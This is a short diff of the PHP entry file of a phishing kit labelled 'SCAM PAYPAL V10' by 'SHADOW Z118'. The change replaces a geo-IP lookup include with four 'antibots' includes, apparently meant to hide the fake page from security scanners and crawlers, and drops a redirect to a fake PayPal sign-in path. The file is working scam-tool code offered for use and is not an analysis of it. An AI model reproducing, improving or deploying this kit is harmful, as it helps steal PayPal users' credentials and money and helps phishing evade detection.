@@ -8,7 +8,7 @@
  |_____/  |_| |_|  \__,_|  \__,_|  \___/    \_/\_/     /_____|   |_|   |_|    \___/ 
                                                                                 
                               #=======================#
-                              #   SCAM PAYPAL v1.10   #
+                              #    SCAM PAYPAL V10    #
                               #      SHADOW Z118      #
                               #=======================#
 							  
@@ -25,10 +25,13 @@
                                     \______/                          
 */
 
-
 session_start();
 error_reporting(0);
-include('./functions/get_ip.php');
+//------------------------------------------|| ANTIBOTS DZEB ||-----------------------------------------------------//
+include "./antibots1.php";
+include "./antibots2.php";
+include "./antibots3.php";
+include "./antibots4.php";
+//----------------------------------------------------------------------------------------------------------------//
 
-header("LOCATION: myaccount/signin/?country.x=".$_SESSION['_LOOKUP_CNTRCODE_']."&locale.x=en_".$_SESSION['_LOOKUP_CNTRCODE_']."");
 ?>
